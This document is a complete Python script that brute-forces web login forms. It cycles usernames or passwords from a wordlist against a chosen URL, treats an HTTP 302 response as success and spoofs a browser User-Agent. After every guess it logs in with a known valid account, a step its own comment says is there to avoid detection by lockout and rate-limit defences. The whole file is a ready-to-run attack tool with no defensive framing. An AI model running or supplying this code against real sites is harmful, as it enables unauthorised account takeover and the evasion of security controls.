import requests

# Function to load the wordlist from a file
def load_wordlist(filepath):
    try:
        with open(filepath, "r") as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {filepath}")
        return []

# Function to attempt login
def attempt_login(url, headers, data, content_type):
    try:
        if content_type == "application/json":
            headers["Content-Type"] = "application/json"
            response = requests.post(url, headers=headers, json=data, allow_redirects=False)  # Disable redirects
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            response = requests.post(url, headers=headers, data=data, allow_redirects=False)  # Disable redirects

        # Return only the status code
        return response.status_code

    except Exception as e:
        print(f"[-] An error occurred: {e}")
        return None

# Main script
if __name__ == "__main__":
    # Get user input for basic setup
    url = input("Enter the login URL (endpoint): ").strip()
    username_field = input("Enter the username field name in the request (e.g., 'username'): ").strip()
    password_field = input("Enter the password field name in the request (e.g., 'password'): ").strip()

    # User chooses content-type header
    content_type = input("Choose content-type (1: application/x-www-form-urlencoded, 2: application/json): ").strip()
    if content_type == "1":
        content_type = "application/x-www-form-urlencoded"
    elif content_type == "2":
        content_type = "application/json"
    else:
        print("[-] Invalid choice. Defaulting to application/x-www-form-urlencoded.")
        content_type = "application/x-www-form-urlencoded"

    # Get valid credentials
    valid_username = input("Enter the valid username: ").strip()
    valid_password = input("Enter the valid password: ").strip()

    # User chooses brute-force mode
    brute_mode = input("Choose brute-force mode (1: Username, 2: Password): ").strip()
    if brute_mode not in ["1", "2"]:
        print("[-] Invalid choice. Exiting.")
        exit()

    # If brute-forcing password, get the target username
    if brute_mode == "2":
        target_username = input("Enter the username to brute-force: ").strip()

    # Get wordlist path
    wordlist_path = input("Enter the path to the wordlist file: ").strip()
    wordlist = load_wordlist(wordlist_path)
    if not wordlist:
        exit()

    # Headers for the request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Brute-force attempt
    for entry in wordlist:
        if brute_mode == "1":
            # Brute-force username
            print(f"Trying login with brute force credentials: {{'{username_field}': '{entry}', '{password_field}': '{valid_password}'}}")
            data = {username_field: entry, password_field: valid_password}
        else:
            # Brute-force password
            print(f"Trying login with brute force credentials: {{'{username_field}': '{target_username}', '{password_field}': '{entry}'}}")
            data = {username_field: target_username, password_field: entry}

        # Attempt login and show only the status code
        status_code = attempt_login(url, headers, data, content_type)
        print(f"[+] Status Code: {status_code}")

        # Check for successful login for the target user
        if status_code == 302:
            if brute_mode == "1":
                print(f"[+] Brute force successful! Username found: {entry}")
            else:
                print(f"[+] Brute force successful! Password found for user '{target_username}': {entry}")
            break  # Stop if brute force is successful

        # Alternate with valid credentials to avoid detection
        print(f"Trying login with valid credentials: {{'{username_field}': '{valid_username}', '{password_field}': '{valid_password}'}}")
        valid_data = {username_field: valid_username, password_field: valid_password}
        status_code = attempt_login(url, headers, valid_data, content_type)
        print(f"[+] Status Code: {status_code}")

        # Do not stop for valid credentials, only for brute-force success